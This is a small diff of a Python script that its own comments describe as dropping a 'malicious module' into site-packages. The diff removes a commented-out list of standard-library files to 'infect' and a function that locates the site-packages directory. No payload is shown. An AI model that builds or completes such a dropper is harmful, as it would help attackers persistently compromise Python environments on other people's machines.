@@ -9,27 +9,9 @@ import re
 import site
 import sys
 
+
 MODULE_CODE = "changeme.py"           # The malicious module source code file
 DEST_MODULE_NAME = "changeme.py"       # The name of the module that will get dropped into sitepkg
-#INCLUDE_LIST = ["datetime.py", "io.py", "operator.py", "os.py", "pickle.py", "random.py", "re.py", "socket.py", "stat.py", "string.py", "subprocess.py" ]  # A list of files we will infect
-
-
-def get_pkg_dir(pth):
-    """
-    Find the correct directory for default packages
-    @return: The path of the python site packages
-    """
-    site_loc = ""
-    for subdir, dirs, files in os.walk(pth):        # iterate through everything
-        for fil in files:
-            fname = os.path.join(subdir, fil)
-            if "site.py" in fname:                      # if it's site
-                fname = fname.split("/")[:-1]
-                fname = "".join(fname)                  # get the directory
-                site_loc = fname
-                return site_loc
-    
-
 
 
 def read_module_code(filename):
